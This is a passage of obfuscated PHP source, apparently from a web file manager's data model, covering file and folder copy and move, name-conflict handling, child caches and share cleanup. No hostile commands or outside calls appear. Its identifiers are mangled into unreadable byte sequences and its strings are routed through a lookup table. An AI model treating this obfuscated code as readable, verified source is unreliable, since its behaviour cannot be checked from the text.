$‡ÏÂ∫ı•[101] && $ç˜º„ÌË == $¨‹Öµ¶Ÿ) { $this->folderSizeResetChildren($ç˜º„ÌË); } Model($‡ÏÂ∫ı•[646])->addAll($ÀΩï÷–¶[$‡ÏÂ∫ı•[644]], array(), !0); if ($ç˜º„ÌË != $¨‹Öµ¶Ÿ || $Ç˘®ù¯Á[$‡ÏÂ∫ı•[496]] == $‡ÏÂ∫ı•[101]) { Model($‡ÏÂ∫ı•[647])->eventCopy($¨‹Öµ¶Ÿ); } $this->saveAll($ÀΩï÷–¶[$‡ÏÂ∫ı•[645]]); Model($‡ÏÂ∫ı•[242])->linkAdd($ÀΩï÷–¶[$‡ÏÂ∫ı•[643]]); $this->folderSizeReset($ÄÿÒåà±); $this->updateModifyTime($ÄÿÒåà±); return $¨‹Öµ¶Ÿ; } private function _copy($‡ıÃ±·ß, $∫≠ŸüÛ¢, $ªΩ›•Äõ, &$∞®üÅÚπ, $™Ê¸Ã„Œ, $‚íã£ß˚ = '') { $⁄ã†ûÙ´ =& $_SERVER[ˆë€Ï⁄∂]; $®Â≤è°á = $this->sourceInfoCache($‡ıÃ±·ß); $¬§ìÌ©÷ = $®Â≤è°á[$⁄ã†ûÙ´[496]] == $⁄ã†ûÙ´[101]; $ÊÎûÔ∏Ì = $‚íã£ß˚ ? $‚íã£ß˚ : $®Â≤è°á[$⁄ã†ûÙ´[32]]; $˝˝Ç®ªé = $this->fileNameExistAuto($∫≠ŸüÛ¢, $®Â≤è°á); if ($™Ê¸Ã„Œ) { $this->_childrenAllMake($‡ıÃ±·ß); if ($¬§ìÌ©÷ && $˝˝Ç®ªé) { $this->_childrenAllMake($˝˝Ç®ªé); } } if (!$˝˝Ç®ªé) { return $this->_copyCreate($‡ıÃ±·ß, $∫≠ŸüÛ¢, $ÊÎûÔ∏Ì, $∞®üÅÚπ); } $±úÂÏÜÁ = $˝˝Ç®ªé; if ($¬§ìÌ©÷) { if ($ªΩ›•Äõ == REPEAT_RENAME_FOLDER) { $ÊÎûÔ∏Ì = $this->fileNameAutoCache($∫≠ŸüÛ¢, $ÊÎûÔ∏Ì, $ªΩ›•Äõ, $¬§ìÌ©÷); $±úÂÏÜÁ = $this->_copyCreate($‡ıÃ±·ß, $∫≠ŸüÛ¢, $ÊÎûÔ∏Ì, $∞®üÅÚπ); } else { $‡˚˜ô›È = $this->_childrenList($‡ıÃ±·ß); foreach ($‡˚˜ô›È as $‹®±–•∆) { $this->_copy($‹®±–•∆[$⁄ã†ûÙ´[203]], $˝˝Ç®ªé, $ªΩ›•Äõ, $∞®üÅÚπ, !1); } } } else { if ($ªΩ›•Äõ == REPEAT_RENAME || $ªΩ›•Äõ == REPEAT_RENAME_FOLDER) { $ÊÎûÔ∏Ì = $this->fileNameAutoCache($∫≠ŸüÛ¢, $ÊÎûÔ∏Ì, $ªΩ›•Äõ, $¬§ìÌ©÷); $±úÂÏÜÁ = $this->_copyCreate($‡ıÃ±·ß, $∫≠ŸüÛ¢, $ÊÎûÔ∏Ì, $∞®üÅÚπ); } else { if ($ªΩ›•Äõ == REPEAT_REPLACE) { $°©‰∫ß¯ = $this->sourceInfoCache($˝˝Ç®ªé); $Ö¬…ﬁøı = $this->fileHistory($°©‰∫ß¯, $®Â≤è°á[$⁄ã†ûÙ´[552]], $®Â≤è°á[$⁄ã†ûÙ´[89]]); if ($Ö¬…ﬁøı) { $∞®üÅÚπ[$⁄ã†ûÙ´[643]][] = $®Â≤è°á[$⁄ã†ûÙ´[552]]; } } else { if ($ªΩ›•Äõ == REPEAT_SKIP) { } } } Hook::trigger($⁄ã†ûÙ´[648], array($⁄ã†ûÙ´[649], $®Â≤è°á, 0)); } return $±úÂÏÜÁ; } private function _copyCreate($ÙπıÒï∑, $üàç·À≥, $õ•ü‹÷˝, &$‡‡…‘»·) { $Éìú∞◊Í =& $_SERVER[ˆë€Ï⁄∂]; $Ï©‚Õû√ = $this->sourceInfoCache($ÙπıÒï∑); $˙îô¡Ö˜ = $this->sourceInfoCache($üàç·À≥); $û˛èºä˜ = $this->_makeItemData($Ï©‚Õû√, $˙îô¡Ö˜, $õ•ü‹÷˝); Hook::trigger($Éìú∞◊Í[650], $û˛èºä˜); Hook::trigger($Éìú∞◊Í[651], array($Éìú∞◊Í[652], $û˛èºä˜, 0)); $˙ß¥π—Ñ = $this->add($û˛èºä˜); $≥íÜç∏Ä = array($Éìú∞◊Í[203] => $˙ß¥π—Ñ, $Éìú∞◊Í[32] => $õ•ü‹÷˝); $this->_copyApplyMeta($≥íÜç∏Ä, $‡‡…‘»·); if ($Ï©‚Õû√[$Éìú∞◊Í[496]] != $Éìú∞◊Í[101]) { $‡‡…‘»·[$Éìú∞◊Í[643]][] = $Ï©‚Õû√[$Éìú∞◊Í[552]]; return $˙ß¥π—Ñ; } $Û´√Åª¿ = array(); $®‹†Çöï = array(); $this->_childrenListAll($ÙπıÒï∑, $Û´√Åª¿); $•ªÚ°Ê£ = count($Û´√Åª¿); if ($•ªÚ°Ê£ == 0) { return $˙ß¥π—Ñ; } $ëüöŸ‘Ç = $this->sourceInfo($˙ß¥π—Ñ); foreach ($Û´√Åª¿ as $ËåÉﬁ∞§) { $‰ª©º¡Ñ = $this->_makeItemData($ËåÉﬁ∞§, $ëüöŸ‘Ç, $ËåÉﬁ∞§[$Éìú∞◊Í[32]]); $‰ª©º¡Ñ[$Éìú∞◊Í[595]] = $ËåÉﬁ∞§[$Éìú∞◊Í[595]]; $®‹†Çöï[] = $‰ª©º¡Ñ; } $this->chunkEventSet($Éìú∞◊Í[653], array($Éìú∞◊Í[654], $û˛èºä˜, $•ªÚ°Ê£)); $this->addAll($®‹†Çöï, array(), !1); $ù≠ÙçÏ∫ = $this->where(array($Éìú∞◊Í[202] => $˙ß¥π—Ñ))->select(); $∞§îÚ¸© = $this->_childrenMakeRelation($Û´√Åª¿, $ù≠ÙçÏ∫); $∞§îÚ¸©[$ÙπıÒï∑] = $˙ß¥π—Ñ; $˚ÒΩò’ = array(); $÷ß£ñÏ≠ = array(); foreach ($ù≠ÙçÏ∫ as $ËåÉﬁ∞§) { $¢ÏÑèÅ’ = $ËåÉﬁ∞§[$Éìú∞◊Í[203]]; $úâ¸◊öÒ = $this->_childrenMatch($∞§îÚ¸©, $ËåÉﬁ∞§, $ëüöŸ‘Ç); $˚ÒΩò’[] = array($Éìú∞◊Í[203], $¢ÏÑèÅ’, $Éìú∞◊Í[202], $úâ¸◊öÒ[$Éìú∞◊Í[202]]); $÷ß£ñÏ≠[] = array($Éìú∞◊Í[203], $¢ÏÑèÅ’, $Éìú∞◊Í[595], $úâ¸◊öÒ[$Éìú∞◊Í[595]]); $this->_copyApplyMeta($ËåÉﬁ∞§, $‡‡…‘»·); if ($ËåÉﬁ∞§[$Éìú∞◊Í[496]] != $Éìú∞◊Í[101]) { $‡‡…‘»·[$Éìú∞◊Í[643]][] = $ËåÉﬁ∞§[$Éìú∞◊Í[552]]; } } $this->chunkEventSet($Éìú∞◊Í[655], array($Éìú∞◊Í[656], $û˛èºä˜, $•ªÚ°Ê£)); $this->saveAll($˚ÒΩò’); $this->chunkEventSet($Éìú∞◊Í[657], array($Éìú∞◊Í[658], $û˛èºä˜, $•ªÚ°Ê£)); $this->saveAll($÷ß£ñÏ≠); return $˙ß¥π—Ñ; } private function _childrenMakeRelation($æ—ÁÊöÈ, $ößΩ…˚ú) { $ı≥Ÿﬁﬂú =& $_SERVER[ˆë€Ï⁄∂]; $˘î™å≠’ = array(); $æ£ã±Ïï = array(); foreach ($æ—ÁÊöÈ as $âñÈØ∂Á) { $¡¶ˆ¸ÃØ = $âñÈØ∂Á[$ı≥Ÿﬁﬂú[32]] . $ı≥Ÿﬁﬂú[8] . $âñÈØ∂Á[$ı≥Ÿﬁﬂú[595]]; $˘î™å≠’[$¡¶ˆ¸ÃØ] = $âñÈØ∂Á[$ı≥Ÿﬁﬂú[203]]; } foreach ($ößΩ…˚ú as $âñÈØ∂Á) { $¡¶ˆ¸ÃØ = $âñÈØ∂Á[$ı≥Ÿﬁﬂú[32]] . $ı≥Ÿﬁﬂú[8] . $âñÈØ∂Á[$ı≥Ÿﬁﬂú[595]]; $¯å˘™í‚ = $˘î™å≠’[$¡¶ˆ¸ÃØ]; $æ£ã±Ïï[$¯å˘™í‚] = $âñÈØ∂Á[$ı≥Ÿﬁﬂú[203]]; } return $æ£ã±Ïï; } private function _childrenMatch($Êî˝®∑É, $Óò›ƒÚÍ, $´¥ö…∞Ï) { $®Ë‡Ë›ø =& $_SERVER[ˆë€Ï⁄∂]; $∞ öÎàı = $´¥ö…∞Ï[$®Ë‡Ë›ø[595]]; $ƒä£ñ∆ú = $this->parentLevelArray($Óò›ƒÚÍ[$®Ë‡Ë›ø[595]]); foreach ($ƒä£ñ∆ú as $µ™Ú√…æ) { if (isset($Êî˝®∑É[$µ™Ú√…æ])) { $∞ öÎàı .= $Êî˝®∑É[$µ™Ú√…æ] . $®Ë‡Ë›ø[659]; } } $∞ öÎàı = rtrim($∞ öÎàı, $®Ë‡Ë›ø[50]) . $®Ë‡Ë›ø[50]; $⁄óÚÀŒ“ = $this->parentLevelArray($∞ öÎàı); $ñ·›˙ô⁄ = $⁄óÚÀŒ“[count($⁄óÚÀŒ“) - 1]; return array($®Ë‡Ë›ø[202] => $ñ·›˙ô⁄, $®Ë‡Ë›ø[595] => $∞ öÎàı); } private function _makeItemData($íı±•ç˝, $ÛÉ¿ÖãÃ, $áØ¥‰ ï) { $ÃáµÖÛÚ =& $_SERVER[ˆë€Ï⁄∂]; $ÔÈ©ÎÙû = array($ÃáµÖÛÚ[660] => $íı±•ç˝[$ÃáµÖÛÚ[496]], $ÃáµÖÛÚ[505] => $áØ¥‰ ï, $ÃáµÖÛÚ[661] => $íı±•ç˝[$ÃáµÖÛÚ[497]] ? $íı±•ç˝[$ÃáµÖÛÚ[497]] : $ÃáµÖÛÚ[12], $ÃáµÖÛÚ[553] => $íı±•ç˝[$ÃáµÖÛÚ[552]] ? $íı±•ç˝[$ÃáµÖÛÚ[552]] : 0, $ÃáµÖÛÚ[631] => $íı±•ç˝[$ÃáµÖÛÚ[89]] ? $íı±•ç˝[$ÃáµÖÛÚ[89]] : 0, $ÃáµÖÛÚ[662] => intval($ÛÉ¿ÖãÃ[$ÃáµÖÛÚ[200]]), $ÃáµÖÛÚ[663] => intval($ÛÉ¿ÖãÃ[$ÃáµÖÛÚ[580]]), $ÃáµÖÛÚ[664] => intval(USER_ID), $ÃáµÖÛÚ[665] => intval(USER_ID), $ÃáµÖÛÚ[488] => intval($ÛÉ¿ÖãÃ[$ÃáµÖÛÚ[203]]), $ÃáµÖÛÚ[666] => $ÛÉ¿ÖãÃ[$ÃáµÖÛÚ[595]] . $ÛÉ¿ÖãÃ[$ÃáµÖÛÚ[203]] . $ÃáµÖÛÚ[50], $ÃáµÖÛÚ[509] => $íı±•ç˝[$ÃáµÖÛÚ[98]] ? $íı±•ç˝[$ÃáµÖÛÚ[98]] : time(), $ÃáµÖÛÚ[515] => 0, $ÃáµÖÛÚ[667] => $ÃáµÖÛÚ[12]); return $ÔÈ©ÎÙû; } private function _copyApplyMeta($’íÂ¶©®, &$ÓıŸçŸ•) { $˜ñÇ≈Ú™ =& $_SERVER[ˆë€Ï⁄∂]; $™èí˚‰ï = $’íÂ¶©®[$˜ñÇ≈Ú™[203]]; $≈˘´˝œ£ = $’íÂ¶©®[$˜ñÇ≈Ú™[32]]; if (!isset($’íÂ¶©®[$˜ñÇ≈Ú™[668]]) || !$’íÂ¶©®[$˜ñÇ≈Ú™[668]] || $’íÂ¶©®[$˜ñÇ≈Ú™[668]] == $˜ñÇ≈Ú™[240]) { $ÓıŸçŸ•[$˜ñÇ≈Ú™[645]][] = array($˜ñÇ≈Ú™[203], $™èí˚‰ï, $˜ñÇ≈Ú™[668], short_id($™èí˚‰ï)); } if (Input::check($≈˘´˝œ£, $˜ñÇ≈Ú™[669])) { $ÓıŸçŸ•[$˜ñÇ≈Ú™[644]][] = array($˜ñÇ≈Ú™[203] => $™èí˚‰ï, $˜ñÇ≈Ú™[107] => $˜ñÇ≈Ú™[549], $˜ñÇ≈Ú™[461] => str_replace($˜ñÇ≈Ú™[53], $˜ñÇ≈Ú™[12], Pinyin::get($≈˘´˝œ£))); $ÓıŸçŸ•[$˜ñÇ≈Ú™[644]][] = array($˜ñÇ≈Ú™[203] => $™èí˚‰ï, $˜ñÇ≈Ú™[107] => $˜ñÇ≈Ú™[548], $˜ñÇ≈Ú™[461] => Pinyin::get($≈˘´˝œ£, $˜ñÇ≈Ú™[670])); } $ÓıŸçŸ•[$˜ñÇ≈Ú™[644]][] = array($˜ñÇ≈Ú™[203] => $™èí˚‰ï, $˜ñÇ≈Ú™[107] => $˜ñÇ≈Ú™[528], $˜ñÇ≈Ú™[461] => KodSort::makeStr($≈˘´˝œ£)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($≥îÂ€√) { $…øâ¯ÇÔ =& $_SERVER[ˆë€Ï⁄∂]; $ ¶Ó£∂á = $this->sourceInfo($≥îÂ€√); $öÅêœ÷ = $…øâ¯ÇÔ[671]; $™êóìÃÁ = array($…øâ¯ÇÔ[595] => array($…øâ¯ÇÔ[626], $ ¶Ó£∂á[$…øâ¯ÇÔ[595]] . $≥îÂ€√ . $…øâ¯ÇÔ[627]), $…øâ¯ÇÔ[516] => $this->targetIsDelete); $°ìºµÁÊ = $this->field($öÅêœ÷)->where($™êóìÃÁ)->select(); if (!$°ìºµÁÊ) { return; } $°ìºµÁÊ = array_to_keyvalue($°ìºµÁÊ, $…øâ¯ÇÔ[203]); foreach ($°ìºµÁÊ as $ÿ¨ıµë˘) { $ΩàŸ”≥ = $ÿ¨ıµë˘[$…øâ¯ÇÔ[202]]; $≥îÂ€√ = $ÿ¨ıµë˘[$…øâ¯ÇÔ[203]]; if (!isset($this->_childrenListCache[$≥îÂ€√]) && $ÿ¨ıµë˘[$…øâ¯ÇÔ[496]] == $…øâ¯ÇÔ[101]) { $this->_childrenListCache[$≥îÂ€√] = array(); } if (!isset($this->_childrenListCache[$ΩàŸ”≥])) { $this->_childrenListCache[$ΩàŸ”≥] = array(); } $this->_childrenListCache[$ΩàŸ”≥][$≥îÂ€√] = $ÿ¨ıµë˘; $this->_childrenItemCache[$≥îÂ€√] = $ÿ¨ıµë˘; } } private function _childrenListAll($ƒﬂ≥πŒ˝, &$¥£µ‰®•) { $º¢ƒõÑª =& $_SERVER[ˆë€Ï⁄∂]; if (!isset($this->_childrenListCache[$ƒﬂ≥πŒ˝])) { return; } $•ËÜôœ∞ = $this->_childrenListCache[$ƒﬂ≥πŒ˝]; foreach ($•ËÜôœ∞ as $›•Ä≈Æ¡ => $ü©“ç˛µ) { $¥£µ‰®•[$›•Ä≈Æ¡] = $ü©“ç˛µ; if ($ü©“ç˛µ[$º¢ƒõÑª[496]] == $º¢ƒõÑª[101]) { $this->_childrenListAll($›•Ä≈Æ¡, $¥£µ‰®•); } } } private function sourceInfoCache($Ωæø¥¯á) { if (isset($this->_childrenItemCache[$Ωæø¥¯á])) { return $this->_childrenItemCache[$Ωæø¥¯á]; } return $this->sourceInfo($Ωæø¥¯á); } private function _childrenList($Î˘∆¸Ì§) { if (isset($this->_childrenListCache[$Î˘∆¸Ì§])) { return $this->_childrenListCache[$Î˘∆¸Ì§]; } return $this->_childrenListSelect($Î˘∆¸Ì§); } private function _childrenListSelect($Ôõ∏ ´º) { $ƒú˛∏€¥ =& $_SERVER[ˆë€Ï⁄∂]; $Ï¬Öì·√ = array($ƒú˛∏€¥[202] => $Ôõ∏ ´º, $ƒú˛∏€¥[516] => $this->targetIsDelete); $Ñ˙‰≤ãñ = $this->where($Ï¬Öì·√)->select(); $Ñ˙‰≤ãñ = $Ñ˙‰≤ãñ ? $Ñ˙‰≤ãñ : array(); $¿öËÙ‹° = array_to_keyvalue($Ñ˙‰≤ãñ, $ƒú˛∏€¥[203]); $this->_childrenListCache[$Ôõ∏ ´º] = $¿öËÙ‹°; foreach ($¿öËÙ‹° as $Ôõ∏ ´º => $£îûãâç) { $this->_childrenItemCache[$Ôõ∏ ´º] = $£îûãâç; } return $¿öËÙ‹°; } private function fileNameExistAuto($üñ±ÏŸﬁ, $”õÆ∆ÎÊ) { $í‡¸√Äé =& $_SERVER[ˆë€Ï⁄∂]; if ($”õÆ∆ÎÊ[$í‡¸√Äé[516]] == $í‡¸√Äé[101]) { return $this->fileNameExist($üñ±ÏŸﬁ, $”õÆ∆ÎÊ[$í‡¸√Äé[32]]); } return $this->fileNameExistCache($üñ±ÏŸﬁ, $”õÆ∆ÎÊ[$í‡¸√Äé[32]]); } private function fileNameExistCache($Ÿ˚ï’¶´, $πÿ≈÷¥´) { $§ñ´Úµ„ =& $_SERVER[ˆë€Ï⁄∂]; $πÿ≈÷¥´ = strtolower($πÿ≈÷¥´); $˜ä‰’ù— = $this->_childrenList($Ÿ˚ï’¶´); foreach ($˜ä‰’ù— as $ç∂ÛˆéÒ) { if ($πÿ≈÷¥´ == strtolower($ç∂ÛˆéÒ[$§ñ´Úµ„[32]])) { return $ç∂ÛˆéÒ[$§ñ´Úµ„[203]]; } } return !1; } private function fileNameAutoCache($˝ø È¶ü, $åÊ”Ù≥», $ÒΩ¯≠ÖÈ, $‚†·Ñö ) { $€¬ı…Â™ =& $_SERVER[ˆë€Ï⁄∂]; $ÃÏ¿¸ô∞ = $this->_childrenList($˝ø È¶ü); $≈¡Ôè›å = array_to_keyvalue($ÃÏ¿¸ô∞, $€¬ı…Â™[12], $€¬ı…Â™[32]); return $this->fileNameAutoGet($≈¡Ôè›å, $åÊ”Ù≥», $ÒΩ¯≠ÖÈ, $‚†·Ñö ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($›±„äµ, $ŸùæùÆ˙, $Äã˝©÷Ç = REPEAT_REPLACE, $‚Îéõ¡Å = '') { $“˛˘ı¿ =& $_SERVER[ˆë€Ï⁄∂]; $∆Ó˝õúÃ = $this->sourceInfo($›±„äµ); $ûÃ˝òî„ = $this->sourceInfo($ŸùæùÆ˙); if ($∆Ó˝õúÃ[$“˛˘ı¿[202]] == $ûÃ˝òî„[$“˛˘ı¿[203]]) { if ($∆Ó˝õúÃ[$“˛˘ı¿[516]] == $“˛˘ı¿[101]) { Model($“˛˘ı¿[514])->restore(array($›±„äµ)); } if (!$‚Îéõ¡Å || $‚Îéõ¡Å == $∆Ó˝õúÃ[$“˛˘ı¿[32]]) { return $›±„äµ; } } $Ï’’£∆ò = $this->pathInfoMore($›±„äµ); if ($this->isParentOf($›±„äµ, $ŸùæùÆ˙)) { return !1; } if (!$∆Ó˝õúÃ || !$ûÃ˝òî„ || $ûÃ˝òî„[$“˛˘ı¿[496]] != $“˛˘ı¿[101]) { return !1; } Hook::trigger($“˛˘ı¿[672], $Ï’’£∆ò); $this->targetIsDelete = intval($∆Ó˝õúÃ[$“˛˘ı¿[516]]); if ($∆Ó˝õúÃ[$“˛˘ı¿[202]] == $ŸùæùÆ˙ && $‚Îéõ¡Å != $∆Ó˝õúÃ[$“˛˘ı¿[32]]) { $≠Ú’œé‚ = $this->fileNameExist($ŸùæùÆ˙, $‚Îéõ¡Å); if ($≠Ú’œé‚ && $∆Ó˝õúÃ[$“˛˘ı¿[496]] == $“˛˘ı¿[240]) { $ç¬˚°ÿ∆ = $this->sourceInfo($≠Ú’œé‚); $à¬ñÖﬂ‘ = $this->fileHistory($ç¬˚°ÿ∆, $∆Ó˝õúÃ[$“˛˘ı¿[552]], $∆Ó˝õúÃ[$“˛˘ı¿[89]]); if (!$à¬ñÖﬂ‘) { Model($“˛˘ı¿[555])->remove($∆Ó˝õúÃ[$“˛˘ı¿[552]]); } $this->removeNow($›±„äµ, !1); $this->folderSizeReset($ŸùæùÆ˙); Hook::trigger($“˛˘ı¿[673], $Ï’’£∆ò); return $≠Ú’œé‚; } } $‰˜éÃ‰Ã = $‚Îéõ¡Å ? $‚Îéõ¡Å : $∆Ó˝õúÃ[$“˛˘ı¿[32]]; $this->lockMoveStart($›±„äµ); $this->lockWriteStart($ŸùæùÆ˙, $‰˜éÃ‰Ã); $¶≥Àòô‚ = array($“˛˘ı¿[643] => array(), $“˛˘ı¿[674] => !1); $this->clearShare($›±„äµ, $ŸùæùÆ˙); $œ˛ÏÍîù = $this->fileNameExistAuto($ŸùæùÆ˙, $∆Ó˝õúÃ); $ÚãÀ∂”” = $this->_move($›±„äµ, $ŸùæùÆ˙, $Äã˝©÷Ç, $¶≥Àòô‚, $‚Îéõ¡Å); $this->sourceCacheClear(); if ($∆Ó˝õúÃ[$“˛˘ı¿[496]] == $“˛˘ı¿[101] && $œ˛ÏÍîù) { $this->folderSizeResetChildren($ÚãÀ∂””); } Model($“˛˘ı¿[242])->linkAdd($¶≥Àòô‚[$“˛˘ı¿[643]]); if ($ÚãÀ∂”” && $œ˛ÏÍîù && $¶≥Àòô‚[$“˛˘ı¿[674]]) { $ã•ªã˙Û = $∆Ó˝õúÃ[$“˛˘ı¿[496]] == $“˛˘ı¿[101] ? $this->_childrenListSelect($›±„äµ) : !1; $¬ΩíÏóﬁ = $ã•ªã˙Û && count($ã•ªã˙Û) > 0 ? !0 : !1; $this->removeNow($›±„äµ, $¬ΩíÏóﬁ); } $this->lockMoveEnd($›±„äµ); $this->lockWriteEnd($ŸùæùÆ˙, $‰˜éÃ‰Ã); $this->folderSizeReset($∆Ó˝õúÃ[$“˛˘ı¿[202]]); $this->folderSizeReset($ŸùæùÆ˙); $¨≥ÕÎåœ = array($∆Ó˝õúÃ[$“˛˘ı¿[202]], $ŸùæùÆ˙); if ($∆Ó˝õúÃ[$“˛˘ı¿[496]] == $“˛˘ı¿[101]) { $¨≥ÕÎåœ[] = $›±„äµ; } $this->updateModifyTime($¨≥ÕÎåœ); Model($“˛˘ı¿[647])->eventMove($›±„äµ, $∆Ó˝õúÃ[$“˛˘ı¿[202]], $ŸùæùÆ˙); Hook::trigger($“˛˘ı¿[673], $Ï’’£∆ò); return $ÚãÀ∂””; } private function _move($ﬁîò≠å£, $∫Û¯´ç¬, $π˘âÀ√√, &$ËøÊ–´Õ, $«∞…§ÖÚ = '') { $¡“Ωîãë =& $_SERVER[ˆë€Ï⁄∂]; $Ì∏ÑÔ•÷ = $this->sourceInfo($ﬁîò≠å£); $à·ÔΩãﬂ = $Ì∏ÑÔ•÷[$¡“Ωîãë[496]] == $¡“Ωîãë[101]; $ΩÂÑ“◊ = $«∞…§ÖÚ ? $«∞…§ÖÚ : $Ì∏ÑÔ•÷[$¡“Ωîãë[32]]; $ÏäÁ‰˜ì = $this->fileNameExistAuto($∫Û¯´ç¬, $Ì∏ÑÔ•÷); $this->lockMoveStart($ﬁîò≠å£); $this->lockWriteStart($∫Û¯´ç¬, $ΩÂÑ“◊); if (!$ÏäÁ‰˜ì) { return $this->_moveForce($ﬁîò≠å£, $∫Û¯´ç¬, $ΩÂÑ“◊); } $•§”¬”ı = $ÏäÁ‰˜ì; $”¸‰Ù◊Ó = !1; if ($à·ÔΩãﬂ) { if ($π˘âÀ√√ == REPEAT_RENAME_FOLDER) { $ΩÂÑ“◊ = $this->fileNameAuto($∫Û¯´ç¬, $ΩÂÑ“◊, $π˘âÀ√√, $à·ÔΩãﬂ); $•§”¬”ı = $this->_moveForce($ﬁîò≠å£, $∫Û¯´ç¬, $ΩÂÑ“◊); } else { $‰ƒéÉÑﬂ = $this->_childrenListSelect($ﬁîò≠å£); foreach ($‰ƒéÉÑﬂ as $Äï˜¥¿Ö) { $ìÓ˛ƒ÷≈ = REPEAT_REPLACE; $this->_move($Äï˜¥¿Ö[$¡“Ωîãë[203]], $ÏäÁ‰˜ì, $ìÓ˛ƒ÷≈, $ËøÊ–´Õ); } $”¸‰Ù◊Ó = !0; } } else { if ($π˘âÀ√√ == REPEAT_RENAME || $π˘âÀ√√ == REPEAT_RENAME_FOLDER) { $ΩÂÑ“◊ = $this->fileNameAuto($∫Û¯´ç¬, $ΩÂÑ“◊, $π˘âÀ√√, $à·ÔΩãﬂ); $•§”¬”ı = $this->_moveForce($ﬁîò≠å£, $∫Û¯´ç¬, $ΩÂÑ“◊); } else { $ΩØ⁄ÒÊ¬ = $this->sourceInfoCache($ÏäÁ‰˜ì); $Â…¡à»ˆ = $this->fileHistory($ΩØ⁄ÒÊ¬, $Ì∏ÑÔ•÷[$¡“Ωîãë[552]], $Ì∏ÑÔ•÷[$¡“Ωîãë[89]]); if ($Â…¡à»ˆ) { $ËøÊ–´Õ[$¡“Ωîãë[643]][] = $Ì∏ÑÔ•÷[$¡“Ωîãë[552]]; } $”¸‰Ù◊Ó = !0; } } if ($”¸‰Ù◊Ó) { $ËøÊ–´Õ[$¡“Ωîãë[674]] = !0; } return $•§”¬”ı; } private function _moveForce($†°˚èÃŒ, $”¥∆èƒê, $ãäÚú‚”) { $›Û˜≠Ç£ =& $_SERVER[ˆë€Ï⁄∂]; $Ø›§Ëïµ = $this->sourceInfo($†°˚èÃŒ); $öçÙÙÁ¢ = $this->sourceInfo($”¥∆èƒê); $Ùÿç≈–õ = $Ø›§Ëïµ[$›Û˜≠Ç£[496]] == $›Û˜≠Ç£[101]; $·–∂éÕ´ = array($›Û˜≠Ç£[488] => $öçÙÙÁ¢[$›Û˜≠Ç£[203]], $›Û˜≠Ç£[666] => $öçÙÙÁ¢[$›Û˜≠Ç£[595]] . $öçÙÙÁ¢[$›Û˜≠Ç£[203]] . $›Û˜≠Ç£[50], $›Û˜≠Ç£[662] => $öçÙÙÁ¢[$›Û˜≠Ç£[200]], $›Û˜≠Ç£[663] => $öçÙÙÁ¢[$›Û˜≠Ç£[580]], $›Û˜≠Ç£[665] => USER_ID, $›Û˜≠Ç£[505] => $ãäÚú‚”); $„±π¬˙Ï = $Ø›§Ëïµ[$›Û˜≠Ç£[200]] == SourceModel::TYPE_GROUP && $öçÙÙÁ¢[$›Û˜≠Ç£[200]] == SourceModel::TYPE_GROUP && $Ø›§Ëïµ[$›Û˜≠Ç£[580]] == $öçÙÙÁ¢[$›Û˜≠Ç£[580]]; if (!$„±π¬˙Ï && $this->moveClearAuth) { Model($›Û˜≠Ç£[578])->authClear($†°˚èÃŒ); } $˙Ü•Ôßî = $Ø›§Ëïµ[$›Û˜≠Ç£[516]] == $›Û˜≠Ç£[101] && $öçÙÙÁ¢[$›Û˜≠Ç£[516]] != $›Û˜≠Ç£[101]; if ($˙Ü•Ôßî) { $·–∂éÕ´[$›Û˜≠Ç£[515]] = 0; } if ($Ùÿç≈–õ) { $ø£µ˙ÿ = array($›Û˜≠Ç£[666] => array($›Û˜≠Ç£[626], $Ø›§Ëïµ[$›Û˜≠Ç£[595]] . $Ø›§Ëïµ[$›Û˜≠Ç£[203]] . $›Û˜≠Ç£[627])); $¥ˆœŸª– = $Ø›§Ëïµ[$›Û˜≠Ç£[595]] . $Ø›§Ëïµ[$›Û˜≠Ç£[203]] . $›Û˜≠Ç£[50]; $¥˚ñ•‡ = $öçÙÙÁ¢[$›Û˜≠Ç£[595]] . $öçÙÙÁ¢[$›Û˜≠Ç£[203]] . $›Û˜≠Ç£[50] . $Ø›§Ëïµ[$›Û˜≠Ç£[203]] . $›Û˜≠Ç£[50]; $˙æø£”œ = array($›Û˜≠Ç£[666] => array($›Û˜≠Ç£[675], "\x72\145\x70\154\141\143\145\x28\160\141\162\145\156\164\114\x65\166\x65\154\54\47{$¥ˆœŸª–}\47\x2c\x27{$¥˚ñ•‡}\47\x29"), $›Û˜≠Ç£[662] => $öçÙÙÁ¢[$›Û˜≠Ç£[200]], $›Û˜≠Ç£[663] => $öçÙÙÁ¢[$›Û˜≠Ç£[580]]); if ($˙Ü•Ôßî) { $˙æø£”œ[$›Û˜≠Ç£[515]] = 0; } $this->where($ø£µ˙ÿ)->data($˙æø£”œ)->save(); } $this->where(array($›Û˜≠Ç£[502] => $†°˚èÃŒ))->data($·–∂éÕ´)->save(); return $†°˚èÃŒ; } private function clearShare($ñ◊œ¬÷¯, $ø£∑ıÎô) { $ë–Ωñì© =& $_SERVER[ˆë€Ï⁄∂]; $Ë∫çïﬁ√ = $this->sourceInfo($ñ◊œ¬÷¯); $û∑ﬁˆ˚∑ = $this->sourceInfo($ø£∑ıÎô); if ($Ë∫çïﬁ√[$ë–Ωñì©[580]] == $û∑ﬁˆ˚∑[$ë–Ωñì©[580]] && $Ë∫çïﬁ√[$ë–Ωñì©[200]] == $ë–Ωñì©[676]) { return; } $√¢Áª∏Ñ = array($ë–Ωñì©[595] => array($ë–Ωñì©[626], $Ë∫çïﬁ√[$ë–Ωñì©[595]] . $ñ◊œ¬÷¯ . $ë–Ωñì©[627])); $˜ÖÖï≠‚ = $this->field($ë–Ωñì©[502])->where($√¢Áª∏Ñ)->getField($ë–Ωñì©[203], !0); if (!$˜ÖÖï≠‚) { return; } $√¢Áª∏Ñ = array($ë–Ωñì©[203] => array($ë–Ωñì©[7], $˜ÖÖï≠‚), $ë–Ωñì©[677] => 1); $É‘ê≠˝• = Model($ë–Ωñì©[678])->field($ë–Ωñì©[679])->where($√¢Áª∏Ñ)->select(); if (!$É‘ê≠˝•) { return; } $É‘ê≠˝• = array_to_keyvalue($É‘ê≠˝•, $ë–Ωñì©[12], $ë–Ωñì©[679]); $√¢Áª∏Ñ = array($ë–Ωñì©[679] => array($ë–Ωñì©[7], $É‘ê≠˝•)); Model($ë–Ωñì©[678])->where($√¢Áª∏Ñ)->save(array($ë–Ωñì©[677] => 0)); Model($ë–Ωñì©[680])->where($√¢Áª∏Ñ)->delete(); } public function copyFolderFromIO($ﬂÿ¸œÃƒ, 